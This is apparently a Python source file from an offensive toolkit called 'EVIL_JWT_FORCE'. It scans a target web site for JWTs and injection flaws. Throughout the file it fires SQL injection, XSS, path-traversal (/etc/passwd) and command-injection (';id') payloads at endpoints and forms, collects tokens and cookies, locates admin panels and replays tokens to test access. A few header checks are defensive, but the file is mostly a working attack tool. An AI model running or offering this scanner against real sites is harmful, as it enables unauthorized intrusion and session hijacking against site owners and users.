#!/usr/bin/env python3
"""
Scanner avançado de endpoints para detecção de JWT, SQLi, XSS, LFI, RCE, IDOR e integração com wordlists.
Totalmente integrado ao ecossistema EVIL_JWT_FORCE.
"""

import sys
import argparse
import asyncio
import re
from termcolor import cprint
from utils.request_builder import build_headers
from utils.constants import COMMON_ENDPOINTS, SQL_PAYLOADS
from utils.helpers import is_valid_url
from config.settings import get_setting
from pathlib import Path
import os
import json
import base64
import logging
import requests
from bs4 import BeautifulSoup
from typing import Dict, List, Any, Optional, Union
import urllib.parse
import time
import threading
from requests.exceptions import RequestException

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/target_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('TARGET_SCANNER')

def highlight(text, color="cyan"):
    try:
        cprint(text, color)
    except Exception:
        print(text)

def load_wordlist(wordlist_path):
    if not wordlist_path or not Path(wordlist_path).exists():
        return []
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def extract_jwts(text):
    jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
    return re.findall(jwt_pattern, text)

def extract_crypto(text):
    patterns = {
        'aes': r'[A-Fa-f0-9]{32,}',
        'base64': r'[A-Za-z0-9+/]{16,}={0,2}'
    }
    found = []
    for ctype, pattern in patterns.items():
        found += [{"type": ctype, "value": m} for m in re.findall(pattern, text)]
    return found

def check_vuln(response_text, vuln_type):
    patterns = {
        'sql_injection': ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error'],
        'xss': ['<script>alert(1)</script>', 'onerror', 'alert(1)'],
        'lfi': ['root:x:', '[extensions]', '[fonts]', 'boot.ini'],
        'rce': ['uid=', 'gid=', 'groups='],
        'idor': ['unauthorized', 'forbidden', 'not allowed']
    }
    text = response_text.lower()
    return any(p in text for p in patterns.get(vuln_type, []))

async def scan_endpoint(session, base_url, endpoint, wordlist=None):
    import aiohttp
    url = base_url.rstrip("/") + endpoint
    results = {
        "endpoint": endpoint,
        "status": None,
        "jwt": [],
        "crypto": [],
        "vulns": [],
        "headers": {},
    }
    try:
        async with session.get(url, headers=build_headers()) as resp:
            results["status"] = resp.status
            text = await resp.text()
            results["headers"] = dict(resp.headers)
            results["jwt"] = extract_jwts(text)
            results["crypto"] = extract_crypto(text)
            # Testes de vulnerabilidades
            payloads = {
                "sql_injection": SQL_PAYLOADS.get("basic", ["' OR 1=1--"]),
                "xss": ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>"],
                "lfi": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"],
                "rce": [";id", "|id", "`id`"],
                "idor": ["1", "2", "3", "4", "5"]
            }
            for vuln, plist in payloads.items():
                for p in plist:
                    async with session.post(url, data={"test": p}, headers=build_headers()) as vresp:
                        vtext = await vresp.text()
                        if check_vuln(vtext, vuln):
                            results["vulns"].append({"type": vuln, "payload": p})
            # Teste com wordlist (se fornecida)
            if wordlist:
                for word in wordlist:
                    async with session.post(url, data={"test": word}, headers=build_headers()) as wresp:
                        wtext = await wresp.text()
                        if "jwt" in wtext.lower() or check_vuln(wtext, "sql_injection"):
                            results["vulns"].append({"type": "wordlist", "payload": word})
    except Exception as e:
        results["error"] = str(e)
    return results

async def advanced_scan(base_url, endpoints, wordlist=None):
    import aiohttp
    results = []
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        tasks = [scan_endpoint(session, base_url, ep, wordlist) for ep in endpoints]
        results = await asyncio.gather(*tasks)
    return results

def main():
    parser = argparse.ArgumentParser(description="Scanner avançado de endpoints para JWT/SQLi/XSS/LFI/RCE/IDOR.")
    parser.add_argument("--url", required=True, help="URL base do alvo (ex: http://alvo.com)")
    parser.add_argument("--wordlist", help="Caminho para wordlist opcional")
    parser.add_argument("--extra", help="Adicionar endpoints extras separados por vírgula")
    args = parser.parse_args()

    base_url = args.url
    if not is_valid_url(base_url):
        highlight("[x] URL inválida!", "red")
        sys.exit(1)

    endpoints = list(COMMON_ENDPOINTS)
    if args.extra:
        endpoints += [ep.strip() for ep in args.extra.split(",") if ep.strip()]
    wordlist = load_wordlist(args.wordlist) if args.wordlist else None

    highlight(f"[*] Iniciando varredura avançada em: {base_url}", "cyan")
    results = asyncio.run(advanced_scan(base_url, endpoints, wordlist))

    found = 0
    for res in results:
        if res.get("status") in [200, 401, 403] or res.get("jwt") or res.get("vulns"):
            found += 1
            highlight(f"\n[+] Endpoint: {base_url.rstrip('/')}{res['endpoint']}", "yellow")
            highlight(f"    Status: {res.get('status')}", "cyan")
            if res.get("jwt"):
                highlight(f"    JWTs encontrados: {res['jwt']}", "green")
            if res.get("crypto"):
                highlight(f"    Possível criptografia: {res['crypto']}", "magenta")
            if res.get("vulns"):
                for v in res["vulns"]:
                    highlight(f"    Vulnerabilidade: {v['type']} | Payload: {v['payload']}", "red")
            if res.get("headers"):
                highlight(f"    Headers: {res['headers']}", "blue")
            if res.get("error"):
                highlight(f"    Erro: {res['error']}", "red")
    highlight(f"\n[✓] Total de possíveis alvos/vulnerabilidades encontrados: {found}", "green")

class TargetScanner:
    """
    Classe para escanear sites alvo em busca de tokens JWT e vulnerabilidades.
    """
    
    def __init__(self, target_url: str, headers: Optional[Dict[str, str]] = None, 
                 cookies: Optional[Dict[str, str]] = None, timeout: int = 10):
        """
        Inicializa o scanner de alvo.
        
        Args:
            target_url: URL do site alvo
            headers: Cabeçalhos HTTP opcionais
            cookies: Cookies opcionais
            timeout: Tempo limite para requisições em segundos
        """
        self.target_url = target_url
        self.headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if cookies:
            self.session.cookies.update(cookies)
        
        # Padrão para detectar tokens JWT
        self.jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        
        logger.info(f"Scanner inicializado para alvo: {target_url}")
    
    def scan(self, log_callback: Optional[callable] = None, progress_callback: Optional[callable] = None, abort_event: Optional[threading.Event] = None) -> Dict[str, Any]:
        """
        Executa o escaneamento completo do alvo.
        
        Returns:
            Resultados do escaneamento
        """
        # Início do escaneamento
        msg = f"Iniciando escaneamento de {self.target_url}"
        logger.info(msg)
        if log_callback: log_callback(msg)
        if progress_callback: progress_callback(0)
        if abort_event and abort_event.is_set():
            if log_callback: log_callback("Varredura abortada pelo usuário")
            return results
        
        results = {
            'target_url': self.target_url,
            'tokens': [],
            'jwt_cookies': [],
            'endpoints': [],
            'vulnerabilities': [],
            'headers': {},
            'admin_panels': []
        }
        
        try:
            # 1. Varrer página inicial
            if abort_event and abort_event.is_set():
                if log_callback: log_callback("Varredura abortada pelo usuário")
                return results
            homepage_result = self._scan_page(self.target_url)
            # Se houve falha de rede ao escanear a página inicial, logar warning mas prosseguir com varredura
            if 'error' in homepage_result:
                warning_msg = f"[!] Falha ao escanear página inicial: {homepage_result['error']}"
                logger.warning(warning_msg)
                if log_callback: log_callback(warning_msg)
            else:
                results['tokens'].extend(homepage_result.get('tokens', []))
                results['jwt_cookies'].extend(homepage_result.get('jwt_cookies', []))
                results['headers'] = homepage_result.get('headers', {})
                if log_callback: log_callback("Página inicial varrida")
            if abort_event and abort_event.is_set():
                if log_callback: log_callback("Varredura abortada pelo usuário")
                return results
            
            # 2. Detectar endpoints de autenticação
            if abort_event and abort_event.is_set():
                if log_callback: log_callback("Varredura abortada pelo usuário")
                return results
            login_endpoints = self._detect_login_endpoints()
            results['endpoints'] = login_endpoints
            if log_callback: log_callback(f"{len(login_endpoints)} endpoints detectados")
            if progress_callback: progress_callback(35)
            
            # 3. Testar endpoints de login/auth
            for idx, endpoint in enumerate(login_endpoints):
                if abort_event and abort_event.is_set():
                    if log_callback: log_callback("Varredura abortada pelo usuário")
                    return results
                logger.info(f"Testando endpoint: {endpoint}")
                if log_callback: log_callback(f"Testando endpoint: {endpoint}")
                endpoint_result = self._scan_page(endpoint)
                results['tokens'].extend(endpoint_result.get('tokens', []))
                results['jwt_cookies'].extend(endpoint_result.get('jwt_cookies', []))
                if progress_callback:
                    progress_callback(35 + int((idx + 1) / len(login_endpoints) * 15))
            
            # 3.5. Teste de injeções em parâmetros GET e formulários
            if abort_event and abort_event.is_set():
                if log_callback: log_callback("Varredura abortada pelo usuário")
                return results
            injection_payloads = {
                'sql_injection': SQL_PAYLOADS,
                'xss': ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>"] ,
                'lfi': ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
            }
            for idx2, endpoint in enumerate(login_endpoints):
                # Injeção via parâmetros GET
                parsed = urllib.parse.urlparse(endpoint)
                qs = urllib.parse.parse_qs(parsed.query)
                if qs:
                    for param in qs:
                        for payload in injection_payloads.get('sql_injection', []):
                            new_qs = {k: [payload] if k == param else v for k, v in qs.items()}
                            new_url = parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True)).geturl()
                            try:
                                resp = self.session.get(new_url, timeout=self.timeout)
                                if check_vuln(resp.text, 'sql_injection'):
                                    results['vulnerabilities'].append({'type':'sql_injection','endpoint':new_url,'payload':payload})
                            except Exception as e:
                                logger.error(f"Erro injetando via GET em {new_url}: {e}")
                                if log_callback: log_callback(f"Erro injetando via GET em {new_url}: {e}")
                # Injeção via formulários HTML
                try:
                    resp_page = self.session.get(endpoint, timeout=self.timeout, allow_redirects=True)
                    soup = BeautifulSoup(resp_page.text, 'html.parser')
                except Exception as e:
                    logger.error(f"Erro ao obter formulário em {endpoint}: {e}")
                    if log_callback: log_callback(f"Erro ao obter formulário em {endpoint}: {e}")
                    continue
                for form in soup.find_all('form'):
                    action = form.get('action') or endpoint
                    form_url = urllib.parse.urljoin(self.target_url, action)
                    inputs = form.find_all(['input','textarea'])
                    for vuln_type, payloads in injection_payloads.items():
                        for payload in payloads:
                            data = {inp.get('name'): payload for inp in inputs if inp.get('name')}
                            if not data:
                                continue
                            try:
                                resp_f = self.session.post(form_url, data=data, timeout=self.timeout)
                                text = resp_f.text
                            except Exception as e:
                                logger.error(f"Erro injetando via POST em {form_url}: {e}")
                                if log_callback: log_callback(f"Erro injetando via POST em {form_url}: {e}")
                                continue
                            if vuln_type == 'sql_injection' and check_vuln(text, 'sql_injection'):
                                results['vulnerabilities'].append({'type':'sql_injection','endpoint':form_url,'payload':payload})
                            if vuln_type == 'xss' and payload in text:
                                results['vulnerabilities'].append({'type':'xss','endpoint':form_url,'payload':payload})
                            if vuln_type == 'lfi' and check_vuln(text, 'lfi'):
                                results['vulnerabilities'].append({'type':'lfi','endpoint':form_url,'payload':payload})
            
            # 4. Verificar cabeçalhos de segurança
            if abort_event and abort_event.is_set():
                if log_callback: log_callback("Varredura abortada pelo usuário")
                return results
            security_headers = self._check_security_headers(results['headers'])
            results['security_headers'] = security_headers
            if log_callback: log_callback("Verificação de headers concluída")
            if progress_callback: progress_callback(80)
            
            # 5. Identificar vulnerabilidades baseadas nos resultados
            if abort_event and abort_event.is_set():
                if log_callback: log_callback("Varredura abortada pelo usuário")
                return results
            vulns = self._identify_vulnerabilities(results)
            results['vulnerabilities'] = vulns
            if log_callback: log_callback(f"{len(vulns)} vulnerabilidades identificadas")
            if progress_callback: progress_callback(100)
            
            # 3.6. Detectar painéis de administração
            if abort_event and abort_event.is_set():
                if log_callback: log_callback("Varredura abortada pelo usuário")
                return results
            admin_panels = self._detect_admin_panels()
            results['admin_panels'] = admin_panels
            if log_callback: log_callback(f"{len(admin_panels)} painéis de administração detectados")
            
            logger.info(f"Escaneamento concluído: {len(results['tokens'])} tokens JWT encontrados")
            return results
            
        except RequestException as e:
            logger.warning(f"Falha de rede ao detectar endpoints: {e}")
        except Exception as e:
            logger.error(f"Erro ao detectar endpoints: {e}")
            results['error'] = str(e)
            return results
    
    def _scan_page(self, url: str) -> Dict[str, Any]:
        """
        Escaneia uma página em busca de tokens JWT.
        
        Args:
            url: URL da página a ser escaneada
            
        Returns:
            Resultados do escaneamento da página
        """
        page_results = {
            'url': url,
            'tokens': [],
            'jwt_cookies': [],
            'headers': {}
        }
        
        try:
            # Fazer requisição GET
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            
            # Verificar cabeçalhos de resposta
            page_results['headers'] = dict(response.headers)
            
            # Procurar tokens JWT nos cabeçalhos
            for header, value in response.headers.items():
                if re.search(self.jwt_pattern, value):
                    page_results['tokens'].append({
                        'location': f'header:{header}',
                        'value': value
                    })
            
            # Procurar tokens JWT nos cookies
            for cookie in response.cookies:
                if re.search(self.jwt_pattern, cookie.value):
                    page_results['jwt_cookies'].append({
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path
                    })
            
            # Procurar tokens JWT no conteúdo da página
            content = response.text
            jwt_matches = re.findall(self.jwt_pattern, content)
            
            for token in jwt_matches:
                page_results['tokens'].append({
                    'location': 'body',
                    'value': token
                })
            
            # Procurar em scripts JavaScript
            script_pattern = r'<script[^>]*>(.*?)</script>'
            scripts = re.findall(script_pattern, content, re.DOTALL)
            
            for script in scripts:
                jwt_in_script = re.findall(self.jwt_pattern, script)
                for token in jwt_in_script:
                    if token not in [t['value'] for t in page_results['tokens']]:
                        page_results['tokens'].append({
                            'location': 'script',
                            'value': token
                        })
            
            return page_results
            
        except Exception as e:
            logger.error(f"Erro ao escanear página {url}: {e}")
            page_results['error'] = str(e)
            return page_results
    
    def _detect_login_endpoints(self) -> List[str]:
        """
        Detecta possíveis endpoints de login/autenticação.
        
        Returns:
            Lista de URLs de endpoints detectados
        """
        endpoints = []
        base_url = self.target_url.rstrip('/')
        
        # Endpoints comuns de autenticação
        common_paths = [
            '/login', '/auth', '/signin', '/api/login', '/api/auth', 
            '/api/token', '/api/jwt', '/oauth/token', '/user/login',
            '/account/login', '/v1/auth', '/v1/token', '/auth/token'
        ]
        
        for path in common_paths:
            endpoints.append(f"{base_url}{path}")
        
        # Tentar detectar endpoints adicionais da página inicial
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            content = response.text
            
            # Procurar URLs que possam ser endpoints de autenticação
            auth_patterns = [
                r'href=[\'"]([^\'"]*login[^\'"]*)[\'"]',
                r'href=[\'"]([^\'"]*auth[^\'"]*)[\'"]',
                r'href=[\'"]([^\'"]*signin[^\'"]*)[\'"]',
                r'action=[\'"]([^\'"]*login[^\'"]*)[\'"]',
                r'action=[\'"]([^\'"]*auth[^\'"]*)[\'"]',
                r'url: ?[\'"]([^\'"]*token[^\'"]*)[\'"]',
                r'url: ?[\'"]([^\'"]*auth[^\'"]*)[\'"]'
            ]
            
            for pattern in auth_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    # Converter URL relativa para absoluta
                    if match.startswith('/'):
                        full_url = f"{base_url}{match}"
                    elif not match.startswith(('http://', 'https://')):
                        full_url = f"{base_url}/{match}"
                    else:
                        full_url = match
                    
                    if full_url not in endpoints:
                        endpoints.append(full_url)
        
        except RequestException as e:
            logger.warning(f"Falha de rede ao detectar endpoints: {e}")
        except Exception as e:
            logger.error(f"Erro ao detectar endpoints: {e}")
        
        return endpoints
    
    def _check_security_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """
        Verifica cabeçalhos de segurança da resposta.
        
        Args:
            headers: Dicionário de cabeçalhos HTTP
            
        Returns:
            Análise dos cabeçalhos de segurança
        """
        security_headers = {
            'X-Content-Type-Options': {'present': False, 'value': None, 'recommended': 'nosniff'},
            'X-Frame-Options': {'present': False, 'value': None, 'recommended': 'DENY or SAMEORIGIN'},
            'X-XSS-Protection': {'present': False, 'value': None, 'recommended': '1; mode=block'},
            'Content-Security-Policy': {'present': False, 'value': None, 'recommended': 'Present'},
            'Strict-Transport-Security': {'present': False, 'value': None, 'recommended': 'max-age=31536000; includeSubDomains'},
            'Access-Control-Allow-Origin': {'present': False, 'value': None, 'recommended': 'Specific domain, not *'},
            'Access-Control-Allow-Credentials': {'present': False, 'value': None, 'recommended': 'Carefully configured'}
        }
        
        for header_name, header_info in security_headers.items():
            if header_name in headers:
                header_info['present'] = True
                header_info['value'] = headers[header_name]
        
        return security_headers
    
    def _identify_vulnerabilities(self, scan_results: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Identifica possíveis vulnerabilidades com base nos resultados do escaneamento.
        
        Args:
            scan_results: Resultados do escaneamento
            
        Returns:
            Lista de vulnerabilidades identificadas
        """
        vulnerabilities = []
        
        # Verificar JWT em cookies sem flags de segurança
        for cookie in scan_results.get('jwt_cookies', []):
            if 'httponly' not in str(cookie).lower():
                vulnerabilities.append({
                    'type': 'insecure_cookie',
                    'severity': 'high',
                    'description': f"Cookie JWT '{cookie['name']}' não tem flag HttpOnly",
                    'recommendation': "Adicionar flag HttpOnly para prevenir acesso via JavaScript"
                })
            
            if 'secure' not in str(cookie).lower() and self.target_url.startswith('https'):
                vulnerabilities.append({
                    'type': 'insecure_cookie',
                    'severity': 'high',
                    'description': f"Cookie JWT '{cookie['name']}' não tem flag Secure",
                    'recommendation': "Adicionar flag Secure para prevenir transmissão via HTTP"
                })
        
        # Verificar cabeçalhos de segurança
        security_headers = scan_results.get('security_headers', {})
        for header, info in security_headers.items():
            if not info['present']:
                vulnerabilities.append({
                    'type': 'missing_security_header',
                    'severity': 'medium',
                    'description': f"Cabeçalho de segurança ausente: {header}",
                    'recommendation': f"Adicionar cabeçalho {header}: {info['recommended']}"
                })
        
        # Verificar tokens JWT
        for token in scan_results.get('tokens', []):
            # Verifica se é possível decodificar o token
            try:
                parts = token['value'].split('.')
                if len(parts) == 3:
                    # Verifica se possui expiração
                    try:
                        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (4 - len(parts[1]) % 4)).decode('utf-8'))
                        if 'exp' not in payload:
                            vulnerabilities.append({
                                'type': 'jwt_no_expiration',
                                'severity': 'high',
                                'description': "Token JWT sem data de expiração",
                                'recommendation': "Adicionar claim 'exp' com tempo de expiração apropriado"
                            })
                    except:
                        pass
                    
                    # Verifica algoritmo
                    try:
                        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4)).decode('utf-8'))
                        if header.get('alg') == 'none':
                            vulnerabilities.append({
                                'type': 'jwt_none_algorithm',
                                'severity': 'critical',
                                'description': "Token JWT usa algoritmo 'none'",
                                'recommendation': "Nunca aceitar tokens com algoritmo 'none'"
                            })
                    except:
                        pass
            except:
                pass
        
        return vulnerabilities
    
    def test_token(self, token: str) -> Dict[str, Any]:
        """
        Testa um token JWT no alvo para verificar sua validade.
        
        Args:
            token: Token JWT para testar
            
        Returns:
            Resultados do teste
        """
        results = {
            'token': token,
            'valid': False,
            'response_code': None,
            'response_size': None,
            'headers': {}
        }
        
        try:
            # Testar como cookie
            cookies = self.cookies.copy()
            cookies['auth'] = token
            cookies['jwt'] = token
            cookies['token'] = token
            
            # Testar como cabeçalho Authorization
            headers = self.headers.copy()
            headers['Authorization'] = f'Bearer {token}'
            
            # Fazer requisição
            response = self.session.get(
                self.target_url,
                headers=headers,
                cookies=cookies,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            results['response_code'] = response.status_code
            results['response_size'] = len(response.content)
            results['headers'] = dict(response.headers)
            
            # Verificar se o token parece válido
            if response.status_code in [200, 201, 202, 203]:
                results['valid'] = True
            
            return results
            
        except Exception as e:
            logger.error(f"Erro ao testar token: {str(e)}")
            results['error'] = str(e)
            return results

    def _detect_admin_panels(self) -> List[str]:
        """
        Detecta painéis de administração e dashboards.
        """
        panels = []
        base_url = self.target_url.rstrip('/')
        common_admin_paths = ['/admin', '/admin/login', '/dashboard', '/admin/dashboard', '/user/admin', '/adminpanel']
        for path in common_admin_paths:
            panels.append(f"{base_url}{path}")
        try:
            resp = self.session.get(self.target_url, timeout=self.timeout, allow_redirects=True)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for a in soup.find_all('a', href=True):
                href = a['href']
                if 'admin' in href.lower() or 'dashboard' in href.lower():
                    if href.startswith('/'):
                        full = f"{base_url}{href}"
                    elif not href.startswith(('http://','https://')):
                        full = f"{base_url}/{href}"
                    else:
                        full = href
                    if full not in panels:
                        panels.append(full)
        except Exception as e:
            logger.error(f"Erro ao detectar painéis de administração: {e}")
        found = []
        for url in panels:
            try:
                r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                if r.status_code == 200:
                    found.append(url)
            except Exception:
                continue
        return found

if __name__ == "__main__":
    main()